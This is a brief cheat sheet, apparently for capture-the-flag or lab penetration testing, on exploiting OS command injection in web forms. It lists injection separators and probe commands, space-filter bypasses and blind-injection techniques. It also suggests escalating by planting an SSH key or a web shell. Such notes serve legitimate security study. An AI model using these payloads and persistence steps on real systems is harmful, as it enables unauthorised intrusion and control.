# Command Injection To Shell

Use when a web field or service wrapper appears to call OS commands.

## Signals

- Ping, traceroute, DNS lookup, archive, image conversion, PDF generation, compiler, or admin maintenance form.
- Error messages from shell utilities.
- Input filtering around spaces, separators, or command names.

## Main Path

Prove safely:

```text
; id
| id
&& id
$(id)
`id`
```

Then enumerate:

```text
; whoami
; uname -a
; pwd
; ls -la
```

## Options To Try

- Space bypass: `${IFS}`, tabs, URL-encoded spaces.
- Separator variants: `;`, `|`, `||`, `&&`, newline.
- Blind injection: use `sleep`, DNS callback, or write a proof file.
- If outbound shell fails, write SSH key, drop web shell, or read files.
- If command is constrained, inspect PATH and allowed binaries.

## Study Examples

- Cajac command injection walkthrough material.
- 0xb0b TryHackMe pages include RCE/CVE-style web command paths.
